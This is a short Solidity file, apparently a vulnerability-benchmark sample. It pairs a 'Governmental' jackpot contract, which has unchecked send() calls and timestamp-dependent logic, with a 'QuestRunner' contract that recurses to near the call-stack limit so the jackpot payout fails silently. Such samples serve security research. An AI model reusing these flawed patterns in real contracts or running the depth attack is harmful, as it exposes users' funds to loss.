pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public finalInvestor;
  uint public jackpot = 1 ether;
  uint public endingInvestmentQuesttime;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    if (msg.value<jackpot/2) throw;
    finalInvestor = msg.sender;
    jackpot += msg.value/2;
    endingInvestmentQuesttime = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < endingInvestmentQuesttime+ONE_MINUTE)
      throw;

    finalInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    finalInvestor = 0;
    jackpot = 1 ether;
    endingInvestmentQuesttime = 0;
  }
}

contract QuestRunner {

  function operate(address goal, uint number) {
    if (0<=number && number<1023) {
      this.operate.gas(msg.gas-2000)(goal, number+1);
    }
    else {
      Governmental(goal).resetInvestment();
    }
  }
}